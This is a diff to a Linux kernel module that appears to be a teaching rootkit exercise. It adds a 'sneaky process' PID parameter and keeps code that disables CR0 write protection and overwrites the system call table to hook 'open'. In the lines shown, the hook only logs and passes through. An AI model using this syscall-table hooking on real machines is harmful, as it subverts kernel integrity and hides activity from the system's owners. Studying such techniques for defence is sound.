@@ -9,6 +9,11 @@
 #include <linux/module.h> // for all modules
 #include <linux/sched.h>
 
+// Module Param -- Take pid of sneaky process as input
+static int sneaky_pid;
+module_param(sneaky_pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
+MODULE_PARM_DESC(sneaky_pid, "PID of sneaky process.");
+
 // Macros for kernel functions to alter Control Register 0 (CR0)
 // This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 // Bit 0 is the WP-bit (write protection). We want to flip this to 0
@@ -21,24 +26,27 @@
 // Grep for "set_pages_ro" and "set_pages_rw" in:
 //      /boot/System.map-`$(uname -r)`
 //      e.g. /boot/System.map-4.4.0-116-generic
-void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040; // 0xffffffff810707b0;
-void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0; // 0xffffffff81070730;
+void (*pages_rw)(struct page *page, int numpages) =
+    (void *)0xffffffff81072040; // 0xffffffff810707b0;
+void (*pages_ro)(struct page *page, int numpages) =
+    (void *)0xffffffff81071fc0; // 0xffffffff81070730;
 
 // This is a pointer to the system call table in memory
 // Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
 // We're getting its adddress from the System.map file (see above).
-static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200; // 0xffffffff81a00200;
+static unsigned long *sys_call_table =
+    (unsigned long *)0xffffffff81a00200; // 0xffffffff81a00200;
 
 // Function pointer will be used to save address of original 'open' syscall.
 // The asmlinkage keyword is a GCC #define that indicates this function
 // should expect to find its arguments on the stack (not in registers).
 // This is used for all system calls.
-asmlinkage int (*original_call)(const char *pathname, int flags);
+asmlinkage int (*original_open_call)(const char *pathname, int flags);
 
 // Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
   printk(KERN_INFO "Very, very Sneaky!\n");
-  return original_call(pathname, flags);
+  return original_open_call(pathname, flags);
 }
 
 // The code that gets executed when the module is loaded
@@ -59,7 +67,7 @@ static int initialize_sneaky_module(void) {
   // This is the magic! Save away the original 'open' system call
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
-  original_call = (void *)*(sys_call_table + __NR_open);
+  original_open_call = (void *)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
   // Revert page to read-only
@@ -86,7 +94,7 @@ static void exit_sneaky_module(void) {
 
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
-  *(sys_call_table + __NR_open) = (unsigned long)original_call;
+  *(sys_call_table + __NR_open) = (unsigned long)original_open_call;
 
   // Revert page to read-only
   pages_ro(page_ptr, 1);
@@ -94,7 +102,8 @@ static void exit_sneaky_module(void) {
   write_cr0(read_cr0() | 0x10000);
 }
 
-MODULE_LICENSE("pr109");
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Prathikshaa Rangarajan");
 
 module_init(initialize_sneaky_module); // what's called upon loading
 module_exit(exit_sneaky_module);       // what's called upon unloading
